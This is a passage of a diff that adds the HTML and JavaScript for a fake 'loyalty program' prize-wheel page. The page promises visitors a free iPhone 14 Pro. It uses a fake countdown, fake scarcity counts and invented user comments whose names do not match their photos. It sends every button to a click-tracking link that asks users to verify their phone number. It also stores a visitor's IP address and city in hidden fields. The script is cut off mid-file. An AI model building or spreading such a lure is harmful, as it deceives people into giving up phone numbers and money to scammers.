@@ -1,0 +1,1236 @@
+<!DOCTYPE html>
+<html lang="en-za"><head>
+<meta http-equiv="content-type" content="text/html; charset=windows-1252">
+
+  <meta name="robots" content="noindex, nofollow, noarchive">
+  <meta name="referrer" content="no-referrer">
+  <meta content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" name="viewport">
+  <title>Congratulations!</title>
+  <link rel="stylesheet" href="files/modal.css">
+  <script src="files/modal.js"></script>
+  <script src="files/jquery.min.js"></script>
+  <link id="favicon" rel="icon" href="files/favicon.ico" type="image/png" sizes="16x16">
+  <style>
+    #ip_text {
+      display: none;
+    }
+    #device_text {
+      display: none;
+    }
+    #browser_text {
+      display: none;
+    }
+    #loc_text {
+      display: none;
+    }
+    #os_text {
+      display: none;
+    }
+    #win_text {
+      display: none;
+    }
+    #ip_check {
+      display: none;
+    }
+    #device_check {
+      display: none;
+    }
+    #browser_check {
+      display: none;
+    }
+    #loc_check {
+      display: none;
+    }
+    #os_check {
+      display: none;
+    }
+  </style>
+  <script>
+    function getParameterByName(name) {
+      name = name.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]");
+      var regex = new RegExp("[\\?&]" + name + "=([^&#]*)"), results = regex.exec(location.search);
+      return results === null ? "" : decodeURIComponent(results[1].replace(/\+/g, " "));
+    }
+    function dateOffset(f, c) {
+      var b = new Boolean(null == f || 0 == f || void 0 == f || "" == f), h = new Date(Date.now() - 24 * f * 60 * 60 * 1000);
+      1 == b && (f = 0);
+      var d = ["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"],
+        g = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];
+      return null != !c && 0 != !c && void 0 != !c ? h.getDate() + " " + g[h.getMonth()] : "day_name_only" == c && b ?
+        d[h.getDay()] : "top_date" == c && b ? d[h.getDay()] + ", " + h.getDate() + " " + g[h.getMonth()] + " " + h.getFullYear() : void 0
+    }
+  </script>
+  <style>
+    .wrapper {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    .icon, .menu {
+      display: inline-block;
+      margin-top: 13px
+    }
+    #wheelCon, .icon, .menu, .logo {
+      background-repeat: no-repeat;
+      background-size: contain
+    }
+    #firstpage, #wheelCon {
+      border-radius: 3px
+    }
+    #pressButton, #wheelCon, .icon, .menu, .logo {
+      background-size: contain
+    }
+    .spinAround, .spinAround2 {
+      animation-timing-function: ease;
+      animation-iteration-count: 1;
+      animation-direction: normal
+    }
+    #header, #subheadline, #topDate {
+      font-size: 25px;
+      text-align: center;
+      color: #050505;
+      margin-bottom: 20px;
+    }
+    #secondpage a, .button, .fm_item, .pi_links a, a.button {
+      text-decoration: none
+    }
+    .button, :focus {
+      outline: 0
+    }
+    ol, ul {
+      list-style: decimal inside
+    }
+    #header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      background: linear-gradient(129deg, #72B3FE 0%, #1A78F2 100%);
+      color: #fff;
+      height: 86px;
+      max-height: 86px;
+      width: 100%;
+      overflow: hidden
+    }
+    #header h3 {
+      display: inline-block;
+      font-size: 1.1em;
+      line-height: 40px;
+      padding-left: 0
+    }
+    .icon {
+      background-image: url(files/ic_round-mail.svg);
+      width: 35px;
+      height: 35px;
+      float: right;
+      margin-right: 10px
+    }
+    .menu {
+      background-image: url(files/ic_round-menu.svg);
+      width: 35px;
+      height: 35px;
+      float: left;
+      margin-left: 10px
+    }
+    #devMockup, #secondpage {
+      display: none
+    }
+    #container {
+      padding: 6px
+    }
+    #firstpage {
+      margin-bottom: 5px;
+      padding: 5px 10px;
+      position: relative;
+    }
+    #secondpage {
+      position: relative;
+    }
+    #subheadline {
+      font-weight: 400;
+      line-height: 15px
+    }
+    .name, .regular_price, .your_price {
+      font-weight: 700
+    }
+    .date {
+      font-size: .85em;
+      color: #9c9c9c;
+      margin: 2px 0
+    }
+    #topDate {
+      width: 100%
+    }
+    .intro {
+      color: #050505;
+      text-align: center;
+      font-style: normal;
+      font-size: 25px;
+      margin-bottom: 10px;
+      max-width: 1276px;
+      font-weight: 600
+    }
+    #wheelCon {
+      position: relative;
+      background-position: center;
+      overflow: hidden
+    }
+    #wheel {
+      z-index: 1;
+      width: 100%;
+      height: auto;
+      margin-top: 50px;
+    }
+    #pressButton {
+      position: absolute;
+      background-image: url(files/arrow.png);
+      cursor: pointer;
+      width: 25%;
+      height: 0;
+      padding-top: 30.5%;
+      z-index: 2;
+      margin-left: auto;
+      margin-right: auto;
+      left: 0;
+      right: 0;
+      top: 110px;
+      border: none;
+      background-color: transparent
+    }
+    .congrats, .timer {
+      line-height: 1.5;
+      padding: 8px
+    }
+    #pressButton:disabled {
+      opacity: 1
+    }
+    #devMockup {
+      position: absolute;
+      max-width: 200px;
+      max-height: 270px;
+      height: auto;
+      z-index: 3
+    }
+    @media(min-width:768px) {
+      #wheel {
+        width: 32vw;
+        left: 47vw;
+        top: 27vw
+      }
+      #pressButton {
+        width: 6%;
+        top: 45% !important;
+        background-repeat: no-repeat
+      }
+    }
+    .spinAround {
+      -webkit-animation: spin 6.6s;
+      animation: spin 6.6s;
+      -webkit-animation-fill-mode: forwards;
+      -moz-animation-fill-mode: forwards;
+      -o-animation-fill-mode: forwards;
+      -ms-animation-fill-mode: forwards;
+      animation-fill-mode: forwards
+    }
+    @-webkit-keyframes spin {
+      0% {
+        -webkit-transform: rotate(0);
+        -ms-transform: rotate(0);
+        transform: rotate(0)
+      }
+      90% {
+        -webkit-transform: rotate(3110deg);
+        -ms-transform: rotate(3110deg);
+        transform: rotate(3110deg)
+      }
+      95% {
+        -webkit-transform: rotate(3108deg);
+        -ms-transform: rotate(3108deg);
+        transform: rotate(3108deg)
+      }
+      100% {
+        -webkit-transform: rotate(3109deg);
+        -ms-transform: rotate(3109deg);
+        transform: rotate(3109deg)
+      }
+    }
+    @keyframes spin {
+      0% {
+        -webkit-transform: rotate(0);
+        -ms-transform: rotate(0);
+        transform: rotate(0)
+      }
+      90% {
+        -webkit-transform: rotate(3110deg);
+        -ms-transform: rotate(3110deg);
+        transform: rotate(3110deg)
+      }
+      95% {
+        -webkit-transform: rotate(3108deg);
+        -ms-transform: rotate(3108deg);
+        transform: rotate(3108deg)
+      }
+      100% {
+        -webkit-transform: rotate(3109deg);
+        -ms-transform: rotate(3109deg);
+        transform: rotate(3109deg)
+      }
+    }
+    .spinAround2 {
+      -webkit-animation: spin2 6.6s;
+      animation: spin2 6.6s;
+      -webkit-animation-fill-mode: forwards;
+      -moz-animation-fill-mode: forwards;
+      -o-animation-fill-mode: forwards;
+      -ms-animation-fill-mode: forwards;
+      animation-fill-mode: forwards
+    }
+    @-webkit-keyframes spin2 {
+      0% {
+        -webkit-transform: rotate(3109deg);
+        -ms-transform: rotate(3109deg);
+        transform: rotate(3109deg)
+      }
+      90% {
+        -webkit-transform: rotate(6314deg);
+        -ms-transform: rotate(6314deg);
+        transform: rotate(6314deg)
+      }
+      95% {
+        -webkit-transform: rotate(6312deg);
+        -ms-transform: rotate(6312deg);
+        transform: rotate(6312deg)
+      }
+      100% {
+        -webkit-transform: rotate(6313deg);
+        -ms-transform: rotate(6313deg);
+        transform: rotate(6313deg)
+      }
+    }
+    @keyframes spin2 {
+      0% {
+        -webkit-transform: rotate(3109deg);
+        -ms-transform: rotate(3109deg);
+        transform: rotate(3109deg)
+      }
+      90% {
+        -webkit-transform: rotate(6314deg);
+        -ms-transform: rotate(6314deg);
+        transform: rotate(6314deg)
+      }
+      95% {
+        -webkit-transform: rotate(6312deg);
+        -ms-transform: rotate(6312deg);
+        transform: rotate(6312deg)
+      }
+      100% {
+        -webkit-transform: rotate(6313deg);
+        -ms-transform: rotate(6313deg);
+        transform: rotate(6313deg)
+      }
+    }
+    .animated {
+      -webkit-animation-duration: 1s;
+      animation-duration: 1s;
+      -webkit-animation-fill-mode: both;
+      animation-fill-mode: both
+    }
+    @-webkit-keyframes rotateIn {
+      0% {
+        -webkit-transform-origin: center;
+        transform-origin: center;
+        -webkit-transform: rotate3d(0, 0, 1, -200deg);
+        transform: rotate3d(0, 0, 1, -200deg);
+        opacity: 0
+      }
+      100% {
+        -webkit-transform-origin: center;
+        transform-origin: center;
+        -webkit-transform: none;
+        transform: none;
+        opacity: 1
+      }
+    }
+    @keyframes rotateIn {
+      0% {
+        -webkit-transform-origin: center;
+        transform-origin: center;
+        -webkit-transform: rotate3d(0, 0, 1, -200deg);
+        transform: rotate3d(0, 0, 1, -200deg);
+        opacity: 0
+      }
+      100% {
+        -webkit-transform-origin: center;
+        transform-origin: center;
+        -webkit-transform: none;
+        transform: none;
+        opacity: 1
+      }
+    }
+    .rotateIn {
+      -webkit-animation-name: rotateIn;
+      animation-name: rotateIn
+    }
+    * {
+      margin: 0
+    }
+    .button {
+      -moz-box-shadow: inset 0 1px 0 0 #7a8eb9;
+      -webkit-box-shadow: inset 0 1px 0 0 #7a8eb9;
+      box-shadow: inset 0 1px 0 0 #7a8eb9;
+      background: -webkit-gradient(linear, left top, left bottom, color-stop(.05, #637aad), color-stop(1, #5972a7));
+      background: -moz-linear-gradient(top, #637aad 5%, #5972a7 100%);
+      background: -webkit-linear-gradient(top, #637aad 5%, #5972a7 100%);
+      background: -o-linear-gradient(top, #637aad 5%, #5972a7 100%);
+      background: -ms-linear-gradient(top, #637aad 5%, #5972a7 100%);
+      background: linear-gradient(to bottom, #637aad 5%, #5972a7 100%);
+      filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#637aad', endColorstr='#5972a7', GradientType=0)
+    }
+    #secondpage {
+      max-width: 650px;
+      margin: 0px auto 30px;
+      border-radius: 8px;
+      background: #fff;
+      padding: 25px;
+    }
+    .smallfont {
+      font-size: 12px
+    }
+    .congrats {
+      font-size: 15px;
+      padding: 0 15px;
+      color: #050505
+    }
+    .congrats a {
+      color: #050505;
+    }
+    .congrats h4 {
+      text-align: center;
+      font-size: 28px
+    }
+    .important {
+      padding: 15px 0 0 0
+    }
+    .timer {
+      padding: 20px 0 0 0
+    }
+    .prize {
+      border-radius: 8px;
+      color: #050505;
+      font-size: 15px;
+      line-height: 1;
+      margin: 15px 0 0
+    }
+    .prize a {
+      color: #fff;
+    }
+    .prize table {
+      width: 100%;
+    }
+    .description {
+      max-width: 300px;
+      margin: 10px 0;
+    }
+    .white-span {
+      color: #ED161F;
+      border-radius: 8px;
+      white-space: nowrap;
+      padding: 3px 6px
+    }
+    ol {
+      padding-left: 0;
+      overflow-x: visible
+    }
+    ol li {
+      padding: 10px 0 0 0;
+      list-style-type: decimal
+    }
+    @media screen and (max-width:359px) {
+      .button {
+        width: 150px !important
+      }
+      .like-line-menu__item {
+        float: left
+      }
+      .send-comments--submit {
+        width: 65px !important
+      }
+    }
+    body {
+      background: #F0F2F5;
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', sans-serif;
+      font-size: small
+    }
+    .lucky {
+      margin-top: 0px;
+      font-size: 25px;
+      color: #050505;
+      font-size: 25px;
+      font-style: normal;
+      font-weight: 600;
+      line-height: 20px;
+    }
+    .border_bottom {
+      border-bottom: 1px solid #dfe3e8
+    }
+    .like_people {
+      margin: 0 0 12px
+    }
+    .like_people_text {
+      vertical-align: top;
+      font-size: 13px;
+      line-height: 18px;
+      color: #65676B;
+      letter-spacing: -.08px;
+      margin: 0 auto 0 0;
+      padding: 0 0 0 6px
+    }
+    .like_people_comments {
+      float: right;
+      padding: 0 0 0 17px
+    }
+    .wi_buttons {
+      padding: 0;
+      position: relative;
+      overflow: visible;
+      height: 46px
+    }
+    .item_like, .item_share, .item_views {
+      color: #65676B;
+      padding: 4px;
+      margin-left: 1px;
+      font-weight: 700
+    }
+    .wi_buttons_wrap {
+      max-width: 430px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin: 0px auto;
+      padding: 10px 0;
+      box-sizing: border-box;
+    }
+    .wi_buttons .like_wrap {}
+    .wi_buttons .item_like, .wi_buttons .item_share {
+      float: none;
+      margin: 0;
+      background: 0 0
+    }
+    .wi_buttons .item_like, .wi_buttons .item_share, .wi_buttons .item_views {
+      line-height: 20px;
+      display: flex;
+      align-items: center;
+    }
+    .item_date, .pi_acts_link .i_icon, .wi_buttons b {
+      display: inline-block;
+      vertical-align: top
+    }
+    .wi_buttons b {
+      color: #050505;
+      font-size: 15px;
+      font-weight: 400;
+      line-height: 20px;
+      letter-spacing: -.2px;
+      margin: 0 0 0 6px !important
+    }
+    .photo_avatar img {
+      border-radius: 50%;
+      height: 40px;
+      width: 40px;
+      margin: 15px 0 0
+    }
+    .comment_wrap {
+      padding: 10px 15px;
+      margin: 15px 0 0;
+      border-radius: 18px;
+      background: #F0F2F5
+    }
+    .comment_name {
+      font-size: 14px;
+      font-weight: 600
+    }
+    .comment_text {
+      font-size: 14px;
+      line-height: 19px;
+      padding: 0;
+      margin-top: 2px;
+      letter-spacing: -.22px
+    }
+    .pi_links, .pi_links a, .show_next {
+      line-height: 16px
+    }
+    .item_date, .pi_links a {
+      font-size: 13px;
+      letter-spacing: -.08px
+    }
+    .item_date {
+      color: #909499
+    }
+    .pi_links {
+      font-size: 13px;
+      color: #65676B;
+      padding: 0;
+      margin: 7px 0 0;
+      overflow: hidden
+    }
+    .pi_links span {
+      font-weight: 700;
+    }
+    .pi_links a {
+      padding: 0;
+      margin: 0 3px;
+      color: #65676B;
+      cursor: pointer
+    }
+    .pi_acts_link {
+      margin: 0 !important;
+      float: right;
+      -webkit-tap-highlight-color: transparent
+    }
+    .pi_acts_link .i_icon {
+      background-image: url(files/61fa494df0bdd.png);
+      background-position: 0 0;
+      margin: 2px 0 0;
+      background-repeat: no-repeat;
+      background-size: 100% !important;
+      width: 12px;
+      height: 12px;
+      padding: 0
+    }
+    .pi_reply_wrap {
+      padding: 0 24px 0 28px
+    }
+    .comments hr {
+      margin: 0 !important
+    }
+    .show_next_wrap {
+      padding: 0 0 1px;
+      border: 0;
+      text-align: center
+    }
+    .show_next {
+      font-size: 14px !important;
+      color: #426997;
+      padding: 15px 0;
+      font-weight: 400;
+      border-radius: 0;
+      border: 0;
+      background: 0 0;
+      display: block
+    }
+    .create_post {
+      background-color: #f1f1f1;
+      border-top: 1px solid #eaeaea;
+      border-bottom: 1px solid #e1e1e1;
+      position: relative;
+      margin-top: -1px;
+      padding: 7px
+    }
+    .comment_item .pi_cont {
+      margin-left: 0;
+      min-height: 34px
+    }
+    .iwrap {
+      margin: 0 6px 0 0
+    }
+    .pi_cont .textfield {
+      height: 3.6em
+    }
+    .create_post .textfield {
+      padding-top: 3px;
+      padding-bottom: 3px;
+      resize: vertical
+    }
+    .textfield {
+      vertical-align: top;
+      width: 100%;
+      min-width: 30px;
+      border: 1px solid #b9c4d1;
+      padding: 2px;
+      margin: 0;
+      -webkit-appearance: none;
+      background: #fff;
+      outline: 0;
+      box-shadow: none;
+      font-size: 14px;
+      box-sizing: content-box;
+      border-radius: 4px
+    }
+    .mfoot {
+      background-color: #f5f5f5
+    }
+    .pfoot {
+      padding: 10px 0
+    }
+    .footer_menu {
+      text-align: center;
+      margin: 5px 0;
+      line-height: 1.6em
+    }
+    .fm_row {
+      display: inline;
+      white-space: nowrap
+    }
+    .button, .clearfix {
+      display: block
+    }
+    .fm_item {
+      padding: 4px 6px;
+      font-size: .93em;
+      color: #8a8a8a
+    }
+    .container {
+      padding: 0 12px 8px
+    }
+    .button {
+      width: 110px;
+      text-align: center;
+      background: #1877F2;
+      border-radius: 6px;
+      cursor: default;
+      color: #fff;
+      font-weight: 600;
+      height: 37px;
+      margin: -37px 0 0 auto;
+      line-height: 37px
+    }
+    .comments {
+      border-radius: 8px;
+      border: 1px solid #FFF;
+      background: #fff;
+      box-shadow: 0px 0px 1px 0px rgba(0, 0, 0, 0.25), 0px 1px 1px 0px rgba(0, 0, 0, 0.10);
+      margin: 0;
+      width: 638px;
+      color: #050505;
+      padding: 30px 30px 55px
+    }
+    td {
+      background-color: transparent;
+      -webkit-transition: all .3s ease-in;
+      -moz-transition: all .3s ease-in;
+      -ms-transition: all .3s ease-in;
+      -o-transition: all .3s ease-in;
+      transition: all .3s ease-in
+    }
+    hr {
+      height: 0;
+      font-size: 0;
+      line-height: 0;
+      border: none;
+      background: 0 0;
+      border-bottom: 1px #dadde1 solid;
+      margin: 0 5px
+    }
+    ul {
+      padding-left: 0;
+      overflow-x: visible
+    }
+    .clearfix:after {
+      content: " ";
+      display: block;
+      height: 0;
+      clear: both;
+      overflow: hidden;
+      visibility: hidden
+    }
+    .fbimg {
+      margin-top: 10px
+    }
+    .fixed_footer {
+      position: fixed;
+      bottom: 10px;
+      height: 50px;
+      border-top: 1px solid #e4e4e4;
+      background-color: #fff;
+      left: 0;
+      right: 0;
+      z-index: 10;
+      box-shadow: 0px 0px 1px 0px rgba(0, 0, 0, 0.25), 0px 1px 1px 0px rgba(0, 0, 0, 0.10);
+      max-width: 80%;
+      margin: 0px auto;
+      border-radius: 8px
+    }
+    .footer_input {
+      color: #050505;
+      border: none;
+      margin-right: 0;
+      font-size: 18px;
+      position: absolute;
+      left: 33px;
+      top: 13px
+    }
+    .footer_input::placeholder {
+      color: #050505;
+    }
+    .btn_send, .clip {
+      max-height: 30px;
+      position: absolute;
+      top: 10px
+    }
+    .clip {
+      left: 10px
+    }
+    .btn_send {
+      right: 10px
+    }
+    .loading {
+      max-width: 300px;
+      margin: 0px auto;
+    }
+    @media screen and (max-device-width:480px) {
+      body {
+        -webkit-text-size-adjust: none
+      }
+    }
+    .logo {
+      /*background-image: url(files/logo.png);*/
+      width: 90px;
+      height: 95px;
+      position: absolute;
+      left: 43px;
+      top: 109px;
+    }
+    .span-second {
+      padding-top: 5px;
+      display: inline-block
+    }
+    .browser {
+      font-weight: 700;
+    }
+    .title {
+      font-size: 50px;
+      margin-bottom: 50px;
+    }
+    #topDate {
+      padding-bottom: 10px;
+      margin-bottom: 20px;
+    }
+    .your_price span {
+      color: #12D678;
+    }
+    .name {
+      color: #3288F6;
+    }
+    @media (max-width: 768px) {
+      #header {
+        height: 60px;
+        margin-bottom: 0;
+      }
+      #header h3 {
+        font-size: 20px;
+      }
+      .menu, .icon {
+        width: 25px;
+        height: 25px;
+        margin-top: 0;
+      }
+      #topDate {
+        font-size: 10px;
+        margin-bottom: 15px;
+      }
+      .title {
+        font-size: 28px;
+        margin-bottom: 20px;
+      }
+      .logo {
+        width: 39px;
+        height: 41px;
+        top: 70px;
+        left: 20px;
+      }
+      .lucky, .intro {
+        font-size: 15px;
+      }
+      #wheel {
+        margin-top: 30px;
+      }
+      #pressButton {
+        width: 18%;
+        padding-top: 22.8%;
+        margin-top: 10px;
+        background-repeat: no-repeat;
+      }
+      .comments {
+        width: 88%;
+        margin: 0px auto;
+        padding: 20px 20px 55px;
+      }
+      .wi_buttons_wrap {
+        max-width: 80%;
+      }
+      #secondpage {
+        border: none;
+        padding: 5px;
+        background-color: transparent;
+        max-width: 500px;
+      }
+      .prize {
+        padding: 7px;
+      }
+      .name {
+        font-size: 14px;
+      }
+      .description {
+        margin: 5px 0;
+        font-size: 12px;
+      }
+      .remaining, .regular_price, .your_price {
+        font-size: 12px;
+      }
+      .img-phone {
+        width: 110px;
+        margin-bottom: 40px;
+      }
+      .button {
+        margin-top: 10px;
+        margin-left: 0;
+        width: 150px;
+        height: 50px;
+        line-height: 50px;
+      }
+    }
+  </style>
+</head>
+<body class="body" oncontextmenu="return!1" onload="setButtonHeight(),autospin1()">
+  <span class="logo"></span>
+  <div id="header">
+    <span class="menu"></span>
+    <h3><span id="headline">LOYALTY PROGRAM</span></h3><span class="icon"></span>
+  </div>
+  <div id="container" class="wrapper">
+    <div align="center" id="firstpage" style="background: inherit;">
+      <div class="date" id="topDate">
+        <script>document.write(dateOffset(0, "top_date"));</script>
+      </div>
+      <div style="margin-bottom:2px">
+        <div id="subheadline">
+          <p class="title">
+            <b>Congratulations!</b>
+          </p>
+          <p class="lucky">Today you are lucky!</p>
+        </div>
+        <div class="intro" style="padding-top:5px">
+          Every <span id="today"><script>document.write(dateOffset(0, "day_name_only"));</script></span> we select 7
+          <span class="browser"><script>/*document.write(getURLParameter("browser"));*/</script></span>
+          users to give them the opportunity to win prizes from our 
+sponsors. Turn the wheel to see which prize you will receive!
+        </div>
+        <div id="wheelCon">
+          <img class=" transparent" height="501" id="wheel" src="files/wheel.png" width="501"> <input id="pressButton" onclick="spin()" style="top: 100.2px;" type="button">
+          <div><img class="animated rotateIn" id="devMockup" src="files/iphone14pro-preview.png" style="display: hidden; left: 64px; top: 42px;"></div>
+        </div>
+      </div>
+      <div id="secondpage">
+        <div class="congrats">
+          <h4>
+            <a href="https://08deh.bemobtrcks.com/click" style="cursor:pointer!important" preventexitpop="false" rel="noreferrer"><font>Congratulations!<br> <span class="span-second"> New iPhone 14 Pro!</span></font></a>
+          </h4>
+          <ol style="text-align:left">
+            <li>Choose a color that you would like. You will be redirected to our sponsor's website.</li>
+            <li>Verify your mobile phone number on the sponsor's website to download your personal voucher and claim your prize.</li>
+          </ol>
+          <div class="important"><b>IMPORTANT:</b> Gifts can end anytime, choose faster!</div>
+          <div class="timer">Offer valid for
+            <font class="white-span" color="red"><b><span id="mins">4</span> minutes and <span id="hsecs">59</span> seconds</b></font>
+          </div>
+        </div>
+        <div class="prize">
+          <table>
+            <tbody>
+              <tr>
+                <th></th>
+                <td style="padding:10px 5px 10px 0;text-align:center"><img class="img-phone" src="files/iphone1.png"></td>
+                <td style="line-height:1.6">
+                  <p style="text-align:left"><a href="https://08deh.bemobtrcks.com/click" style="cursor:pointer!important" preventexitpop="false" rel="noreferrer"><span class="name">iPhone 14 Pro 256GB (Gold)</span></a></p>
+                  <p class="description">6.1-inch Super Retina XDR display² featuring Always-On and ProMotion</p>
+                  <p class="regular_price">Retail price: <s class="white-span">&#8369; 73,890</s></p>
+                  <p class="your_price">Your price: <span>&#8369; 0</span></p>
+                  <p class="remaining"><b>Left: <span>2</span></b></p>
+                  <div><a class="button" href="https://08deh.bemobtrcks.com/click" style="cursor:pointer!important" preventexitpop="false" rel="noreferrer"> Choose </a></div>
+                </td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+        <div class="prize">
+          <table>
+            <tbody>
+              <tr>
+                <th></th>
+                <td style="padding:10px 5px 10px 0;text-align:center"><img class="img-phone" src="files/iphone2.png"></td>
+                <td style="line-height:1.6">
+                  <p style="text-align:left"><a href="https://08deh.bemobtrcks.com/click" style="cursor:pointer!important" preventexitpop="false" rel="noreferrer"><span class="name">iPhone 14 Pro 256GB (Silver)</span></a></p>
+                  <p class="description">6.1-inch Super Retina XDR display² featuring Always-On and ProMotion</p>
+                  <p class="regular_price">Retail price: <s class="white-span">&#8369; 73,890</s></p>
+                  <p class="your_price">Your price: <span> &#8369; 0 </span></p>
+                  <p class="remaining"><b>Left: <span>1</span></b></p>
+                  <div><a class="button" href="https://08deh.bemobtrcks.com/click" style="cursor:pointer!important" preventexitpop="false" rel="noreferrer"> Choose </a></div>
+                </td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+    <div class="container">
+      <div class="comments">
+        <div class="wi_like_wrap border_bottom">
+          <div class="like_people">
+            <img class="like_people_image" src="files/likes.png">
+            <span class="like_people_text">2319</span>
+            <span class="like_people_comments">234 shares</span>
+            <span class="like_people_comments">32 comments</span>
+          </div>
+        </div>
+        <div class="wi_buttons border_bottom">
+          <div class="wi_buttons_wrap">
+            <span class="item_like _i"><img src="files/like.png" alt=""> <b class="v_like">Like</b></span>
+            <span class="item_share is_empty _i"><img src="files/comment.png" alt=""> <b class="v_share">Comment</b></span>
+            <span class="item_views"><img src="files/share.png" alt=""> <b class="v_views">Share</b></span>
+          </div>
+        </div>
+        <center>
+          <font face="arial"></font>
+          <table border="0" cellpadding="4" cellspacing="0" style="max-width:546px;padding-top:10px;font-size:13px" width="100%">
+            <tbody id="comments_list">
+              <tr>
+                <td align="right" class="photo_avatar" valign="top" width="40"><img src="files/Silas-Kumar.jpeg"></td>
+                <td align="left" valign="top">
+                  <div class="comment_wrap">
+                    <div class="comment_name">Robert Gomez</div>
+                    <div class="comment_text">Dropped iPhone 14 Pro! Honestly, I wanted the Steam Deck, but not today ...</div>
+                  </div>
+                  <div class="pi_links">
+                    <span class="like_wrap"><span class="pi_link">Like</span></span>
+                    <span class="pi_reply_wrap"><span>Comment</span></span>
+                    <span class="pi_acts_link"><i class="i_icon"></i></span> 8h
+                  </div>
+                </td>
+              </tr>
+              <tr>
+                <td align="right" class="photo_avatar" valign="top" width="40"><img src="files/Jonah-Al-habsi.jpeg"></td>
+                <td align="left" valign="top">
+                  <div class="comment_wrap">
+                    <div class="comment_name">Mark Garsia</div>
+                    <div class="comment_text">I won 1 free spin, but I did not win a prize. Can I get another chance?</div>
+                  </div>
+                  <div class="pi_links">
+                    <span class="like_wrap"><span class="pi_link">Like</span></span>
+                    <span class="pi_reply_wrap"><span>Comment</span></span>
+                    <span class="pi_acts_link"><i class="i_icon"></i></span> 2d
+                  </div>
+                </td>
+              </tr>
+              <tr>
+                <td align="right" class="photo_avatar" valign="top" width="40"><img src="files/Vihaan-Kannan.jpeg"></td>
+                <td align="left" valign="top">
+                  <div class="comment_wrap">
+                    <div class="comment_name">Joel Mendez</div>
+                    <div class="comment_text">I just unpacked the new Steam Deck! This is the best prize of all!</div>
+                  </div>
+                  <div class="pi_links">
+                    <span class="like_wrap"><span class="pi_link">Like</span></span>
+                    <span class="pi_reply_wrap"> <span>Comment</span></span>
+                    <span class="pi_acts_link"><i class="i_icon"></i></span> 4d
+                  </div>
+                </td>
+              </tr>
+              <tr>
+                <td align="right" class="photo_avatar" valign="top" width="40"><img src="files/Mariam-Saeed.jpg"></td>
+                <td align="left" valign="top">
+                  <div class="comment_wrap">
+                    <div class="comment_name">Ana Rivera</div>
+                    <div class="comment_text">At first I thought it was a joke, but this morning I was delivered a new iPhone 14 Pro, I also got a T-shirt with a logo!</div>
+                  </div>
+                  <div class="pi_links">
+                    <span class="like_wrap"><span class="pi_link">Like</span></span>
+                    <span class="pi_reply_wrap"><span>Comment</span></span> <span class="pi_acts_link"><i class="i_icon"></i></span> 4d
+                  </div>
+                </td>
+              </tr>
+              <tr>
+                <td align="right" class="photo_avatar" valign="top" width="40"><img src="files/Fatima-Khan.jpeg"></td>
+                <td align="left" valign="top">
+                  <div class="comment_wrap">
+                    <div class="comment_name">Rowena Mendoza</div>
+                    <div class="comment_text">My Samsung Galaxy S23 arrived this morning! I love it!!!</div>
+                  </div>
+                  <div class="pi_links">
+                    <span class="like_wrap"><span class="pi_link">Like</span></span>
+                    <span class="pi_reply_wrap"><span>Comment</span></span>
+                    <span class="pi_acts_link"><i class="i_icon"></i></span> 5d
+                  </div>
+                </td>
+              </tr>
+              <tr>
+                <td align="right" class="photo_avatar" valign="top" width="40"><img src="files/Liya-Pillai.jpg"></td>
+                <td align="left" valign="top">
+                  <div class="comment_wrap">
+                    <div class="comment_name">Mary Vergara</div>
+                    <div class="comment_text">I won the AirPods Pro. I still do not believe that this is true!</div>
+                  </div>
+                  <div class="pi_links">
+                    <span class="like_wrap"><span class="pi_link">Like</span></span>
+                    <span class="pi_reply_wrap"><span>Comment</span></span>
+                    <span class="pi_acts_link"><i class="i_icon"></i></span> 6d
+                  </div>
+                </td>
+              </tr>
+              <tr>
+                <td align="right" class="photo_avatar" valign="top" width="40"><img src="files/Mark-Garsia.jpg"></td>
+                <td align="left" valign="top">
+                  <div class="comment_wrap">
+                    <div class="comment_name">Rolando Cruz</div>
+                    <div class="comment_text">I won the iPhone 14, but I already have it, can I change the prize on the Steam Deck?</div>
+                  </div>
+                  <div class="pi_links">
+                    <span class="like_wrap"><span class="pi_link">Like</span></span>
+                    <span class="pi_reply_wrap"><span>Comment</span></span>
+                    <span class="pi_acts_link"><i class="i_icon"></i></span> 7d
+                  </div>
+                </td>
+              </tr>
+            </tbody>
+          </table>
+        </center>
+      </div>
+    </div>
+    <div class="fixed_footer"><input class="footer_input" placeholder="Write a comment..." type="text"> <img alt="" class="btn_send" src="files/smile.svg"></div>
+  </div>
+  <input type="hidden" name="ip" value="2a02:a45e:c49b:1:7678:fafb:e7b3:b507"><input type="hidden" name="country" value="The Netherlands"><input type="hidden" name="city" value="Kampen">
+  <script type="text/javascript">
+        var divIntro = $('div .intro'); divIntro.html(divIntro.html().replace('Unknown','Safari'));
+    let date = new Date('Feb 10 2022 00:00:00');
+    function counts() {
+      if (document.getElementById('timer__till')) {
+        let now = new Date(); let gap = date - now;
+        let days = Math.floor(gap / 1000 / 60 / 60 / 24);
+        let hours = Math.floor(gap / 1000 / 60 / 60) % 24;
+        let minutes = Math.floor(gap / 1000 / 60) % 60;
+        let seconds = Math.floor(gap / 1000) % 60;
+        if (gap > 0) {
+          document.getElementById('days').innerText = days;
+          document.getElementById('hours').innerText = hours;
+          document.getElementById('minutes').innerText = minutes;
+          document.getElementById('seconds').innerText = seconds;
+          if (days < 10) { document.getElementById('days').innerText = '0' + days; }
+          if (hours < 10) { document.getElementById('hours').innerText = '0' + hours; }
+          if (minutes < 10) { document.getElementById('minutes').innerText = '0' + minutes; }
+          if (seconds < 10) { document.getElementById('seconds').innerText = '0' + seconds; }
+        }
+        else {
+          document.querySelector('.timer__wrapper').innerText = 'Акция завершилась';
+        }
+      } else {
+        clearInterval(intervalId)
+      }
+    }
+    let intervalId = setInterval(() => { counts(); }, 1000);
+    var page = ("page"), brand = ("device_brand");
+    var conMid, mydate = new Date,
+      year = mydate.getFullYear(), month = mydate.getMonth(), day = mydate.getDate(), weekday = mydate.getDay(),
+      count = 1,
+      headline = document.getElementById("headline"),
+      topDate = document.getElementById("topDate"),
+      today = document.getElementById("today"),
+      con = document.getElementById("container"),
+      whCon = document.getElementById("wheelCon"),
